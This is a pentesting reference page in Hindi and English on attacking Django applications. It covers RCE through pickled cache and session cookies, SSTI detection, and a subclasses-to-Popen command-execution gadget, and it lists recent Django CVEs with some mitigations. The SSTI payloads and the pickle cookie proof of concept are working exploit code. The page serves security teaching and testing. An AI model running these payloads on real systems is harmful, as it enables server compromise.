# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Django का डिफ़ॉल्ट cache स्टोरेज तरीका [Python pickles](https://docs.python.org/3/library/pickle.html) है, जो RCE का कारण बन सकता है अगर [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)। **अगर एक attacker cache पर write access प्राप्त कर लेता है, तो वे इस vulnerability को underlying server पर RCE में escalate कर सकते हैं**।

Django cache को चार जगहों में से किसी एक में स्टोर किया जाता है: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), या एक [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95)। Redis server या database में स्टोर cache सबसे संभावित attack vectors हैं (Redis injection और SQL injection), लेकिन एक attacker file-based cache का उपयोग करके arbitrary write को RCE में बदल सकता है। Maintainers ने इसे non-issue चिह्नित किया है। यह ध्यान में रखना महत्वपूर्ण है कि cache file folder, SQL table name, और Redis server विवरण implementation के आधार पर भिन्न होंगे।

This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
The Django Template Language (DTL) is **Turing-complete**. अगर user-supplied data को *template string* के रूप में render किया जाता है (उदाहरण के लिए `Template(user_input).render()` को कॉल करके या जब `|safe`/`format_html()` auto-escaping को हटाते हैं), तो एक attacker पूरा SSTI → RCE हासिल कर सकता है।

### Detection
1. उन dynamic calls को देखें जो `Template()` / `Engine.from_string()` / `render_to_string()` को कॉल करते हैं और जिनमें *कोई भी* बिना sanitize किए हुए request data शामिल हो।
2. समय-आधारित या अंकगणितीय payload भेजें:
```django
{{7*7}}
```
यदि rendered output में `49` दिखाई देता है तो input template engine द्वारा compiled किया जा रहा है।

### Primitive to RCE
Django सीधे `__import__` तक पहुँच को ब्लॉक करता है, लेकिन Python object graph तक पहुँच संभव है:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
`subprocess.Popen` का इंडेक्स खोजें (≈400–500, Python build पर निर्भर) और मनमाने कमांड निष्पादित करें:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
एक अधिक सुरक्षित universal gadget यह है कि `cls.__name__ == 'Popen'` होने तक iterate करें।

The same gadget works for **Debug Toolbar** or **Django-CMS** template rendering features that mishandle user input।

---

### यह भी देखें: ReportLab/xhtml2pdf PDF export RCE
Django पर बने applications आमतौर पर xhtml2pdf/ReportLab को views को PDF के रूप में export करने के लिए integrate करते हैं। जब उपयोगकर्ता-नियंत्रित HTML PDF generation में चला जाता है, rl_safe_eval त्रि-ब्रैकेट्स `[[[ ... ]]]` के अंदर expressions का मूल्यांकन कर सकता है जिससे code execution संभव हो जाता है (CVE-2023-33733)। विवरण, payloads, और mitigations:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
यदि सेटिंग `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` सक्षम है (या कोई कस्टम serializer जो pickle को deserialise करता है), Django *decrypts and unpickles* session cookie को किसी भी view code को कॉल करने से **पहले** कर देता है। इसलिए, एक मान्य signing key (परियोजना का `SECRET_KEY` सामान्यतः) का होना तत्काल remote code execution के लिए पर्याप्त है।

### Exploit Requirements
* सर्वर `PickleSerializer` का उपयोग करता है।
* हमलावर `settings.SECRET_KEY` जानता है / अनुमान लगा सकता है (leaks via GitHub, `.env`, error pages, etc.)।

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
Send the resulting cookie, and the payload runs with the permissions of the WSGI worker.

**निवारण**: डिफ़ॉल्ट `JSONSerializer` रखें, `SECRET_KEY` को रोटेट करें, और `SESSION_COOKIE_HTTPONLY` कॉन्फ़िगर करें।

---

## हाल के (2023-2025) उच्च-प्रभाव वाले Django CVEs जिन्हें Pentesters को जांचना चाहिए
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (fixed June 4 2025). यह हमलावरों को log फ़ाइलों में newlines/ANSI codes छिपाने और downstream log analysis को दूषित करने की अनुमति देता है। Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). JSON keys को रचा जा सकता है ताकि quoting से बाहर निकलकर arbitrary SQL execute किया जा सके। Fixed in 4.2.15 / 5.0.8.

हमेशा सटीक framework संस्करण की fingerprinting करें `X-Frame-Options` error page या `/static/admin/css/base.css` hash के माध्यम से और जहाँ लागू हो ऊपर दिए गए मुद्दों का परीक्षण करें।

---

## References
* Django security release – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
